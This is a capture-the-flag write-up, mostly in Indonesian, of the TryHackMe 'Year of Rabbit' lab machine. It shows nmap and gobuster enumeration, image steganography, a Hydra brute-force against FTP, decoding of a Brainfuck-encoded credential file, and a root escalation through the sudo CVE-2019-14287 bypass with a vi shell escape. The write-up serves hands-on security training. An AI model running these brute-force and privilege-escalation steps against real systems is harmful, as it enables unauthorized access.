# Write-Up: Year of Rabbit — TryHackMe

> **Platform:** TryHackMe  
> **Room:** Year of Rabbit  
> **Difficulty:** Easy  
> **Tags:** FTP, SSH, Brainfuck, CVE-2019-14287

---

## 1. Reconnaissance

### Nmap Scan

```bash
nmap -A -O -Pn 10.49.146.47
```

Hasil scan menunjukkan tiga port yang terbuka:

| Port | Service | Versi |
|------|---------|-------|
| 21/tcp | FTP | vsftpd 3.0.2 |
| 22/tcp | SSH | OpenSSH 6.7p1 Debian 5 |
| 80/tcp | HTTP | Apache httpd 2.4.10 (Debian) |

---

## 2. Enumerasi Web (Port 80)

### Gobuster

```bash
gobuster dir --url http://10.49.146.47 -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

```
/.htaccess   (Status: 403)
/.hta        (Status: 403)
/.htpasswd   (Status: 403)
/assets      (Status: 301)
/index.html  (Status: 200)
/server-status (Status: 403)
```

Tidak ada direktori menarik dari gobuster. Namun, saat memeriksa source code halaman, ditemukan komentar tersembunyi di dalam CSS:

```css
/* Nice to see someone checking the stylesheets.
   Take a look at the page: /sup3r_REDACTED_.php
*/
```

<img width="624" height="363" alt="yON1" src="https://github.com/user-attachments/assets/efeef10f-2acc-4a9f-a035-4bb94876c1b5" />

---

### Intercept dengan Burp Suite

Saat mengakses `/sup3r_REDACTED.php`, halaman melakukan redirect. Setelah di-intercept dengan Burp Suite, ditemukan header berikut:

```http
HTTP/1.1 302 Found
Location: intermediary.php?hidden_directory=/REDACTED
```

HTTP/1.1 302 Found
Date: Fri, 22 May 2026 14:23:19 GMT
Server: Apache/2.4.10 (Debian)
Location: intermediary.php?hidden_directory=/REDACTED
Content-Length: 0
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

Direktori `/WExYY2Cv-qU` mengandung sebuah gambar bernama `Hot_Babe.png`.

---

## 3. Analisis Gambar (Steganografi)

### ExifTool

```bash
exiftool Hot_Babe.png
```

```
File Name       : Hot_Babe.png
File Size       : 475 kB
Image Width     : 512
Image Height    : 512
Warning         : [minor] Trailer data after PNG IEND chunk
```

ExifTool tidak memberikan informasi berguna. Namun, peringatan **"Trailer data after PNG IEND chunk"** mengindikasikan ada data tersembunyi setelah akhir file PNG.


### Strings

Jalankan `strings` pada gambar untuk mengekstrak teks tersembunyi:

```bash
strings Hot_Babe.png
```

Hasilnya mengandung username dan daftar password yang akan digunakan untuk brute-force FTP.

<img width="624" height="233" alt="YON2" src="https://github.com/user-attachments/assets/56e0cb7e-bedf-41da-83c3-fd5b0cb4c87c" />


---

## 4. Brute-Force FTP

Gunakan username dan password list hasil `strings` tadi dengan Hydra:

```bash
hydra -L user.txt -P password.txt ftp://10.49.146.47
```

```
[21][ftp] host: 10.49.146.47   login: REDACTED   password: REDACTED
1 of 1 target successfully completed, 1 valid password found
```

---

## 5. Akses FTP

Login menggunakan kredensial yang ditemukan:

```bash
ftp 10.49.146.47
```

```
ftp> ls
-rw-r--r--    1 0   0   758 Jan 23  2020 Eli's_Creds.txt

ftp> get Eli's_Creds.txt
```

---

## 6. Decode Brainfuck Cipher

Isi dari `Eli's_Creds.txt` adalah cipher **Brainfuck**:

```
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
...
```

Decode menggunakan tools online Brainfuck decoder 

<img width="624" height="119" alt="YOR" src="https://github.com/user-attachments/assets/29975c85-8e5e-4367-96e0-47afd5167045" />


Hasil decode berisi **username dan password** untuk login SSH sebagai user `REDACTED`.

---

## 7. Akses SSH sebagai USER YANG DIDAPAT


Saat login, muncul pesan dari root:

```
1 new message

Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place.
I've left you a hidden message there"

END MESSAGE
```

Eksplorasi direktori home:

```bash
eli@year-of-the-rabbit:~$ ls
core  Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos

eli@year-of-the-rabbit:/home$ ls
eli  gwendoline
```

Terdapat user lain bernama `gwendoline`. File `user.txt` ada di sana namun tidak bisa dibaca:

```bash
eli@year-of-the-rabbit:/home/gwendoline$ cat user.txt
cat: user.txt: Permission denied
```

---

## 8. Lateral Movement ke Gwendoline

Berdasarkan clue pesan root ("leet s3cr3t hiding place"), gunakan `locate`:

```bash
locate s3cr3t
```

```
/usr/games/s3cr3t
/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
/var/www/html/sup3r_s3cr3t_fl4g.php
```

Baca file tersembunyi:

```bash
cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
```

```
Your password is awful, Gwendoline.
It should be at least 60 characters long! Not just {REDACTED}

Honestly!

Yours sincerely
   -Root
```

Password Gwendoline ditemukan: **`REDACTED`**

### Login sebagai Gwendoline

```bash
su gwendoline
# Password: REDACTED
```

### User Flag

```bash
gwendoline@year-of-the-rabbit:~$ cat user.txt
THM{***REDACTED***}
```

---

## 9. Privilege Escalation ke Root (CVE-2019-14287)

Cek sudo privileges:

```bash
sudo -l
```

```
User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

Konfigurasi `(ALL, !root)` seharusnya mencegah eksekusi sebagai root. Namun, versi sudo yang lama rentan terhadap **CVE-2019-14287** — bypass dengan menggunakan UID `-1` yang diinterpretasikan sebagai UID `0` (root).

```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

Di dalam vim, jalankan shell escape:

```vim
:!/bin/sh
```

Shell root berhasil diperoleh!

```bash
# whoami
root

# cd /root
# cat root.txt
THM{***REDACTED***}
```

---

## Ringkasan

| Langkah | Teknik | Detail |
|---------|--------|--------|
| Recon | Nmap | Port 21, 22, 80 terbuka |
| Web Enum | Source code + Burp Suite | Hidden directory via CSS comment & 302 redirect |
| Stego | `strings` | Password list tersembunyi dalam gambar PNG |
| Brute-force | Hydra | Kredensial FTP: `ftpuser` |
| Cipher | Brainfuck decode | Kredensial SSH user `eli` |
| Lateral Move | Hidden file + `locate` | Password Gwendoline dari pesan root |
| PrivEsc | CVE-2019-14287 | Sudo bypass via `sudo -u#-1` + vim shell escape |
